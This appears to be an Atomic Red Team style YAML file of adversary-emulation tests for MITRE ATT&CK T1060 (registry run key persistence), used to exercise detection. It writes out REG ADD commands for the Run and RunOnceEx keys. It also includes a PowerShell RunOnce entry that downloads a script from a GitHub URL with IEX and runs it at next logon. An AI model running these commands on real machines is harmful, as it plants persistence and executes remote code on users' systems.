---
attack_technique: T1060
display_name: Registry Run Keys / Start Folder

atomic_tests:
- name: Reg Key Run
  description: |
    Run Key Persistence
  supported_platforms:
    - windows
  input_arguments:
    command_to_execute:
      description: Thing to Run
      type: Path
      default: C:\Windows\System32\calc.exe
  executor:
    name: command_prompt
    command: |
      REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Thremulate" /t REG_SZ /F /D "#{command_to_execute}"
      REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Thremulate" /f

- name: Reg Key RunOnce
  description: |
    RunOnce Key Persistence
  supported_platforms:
    - windows
  input_arguments:
    thing_to_execute:
      description: Thing to Run
      type: Path
      default: C:\Windows\System32\calc.exe
  executor:
    name: command_prompt
    command: |
      REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
      REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f

- name: PowerShell Registry RunOnce
  description: |
    RunOnce Key Persistence via PowerShell
  supported_platforms:
    - windows
  input_arguments:
    thing_to_execute:
      description: Thing to Run
      type: Path
      default: powershell.exe
  executor:
    name: powershell
    command: |
      $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/ARTifacts/Misc/Discovery.bat`")"'
      Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
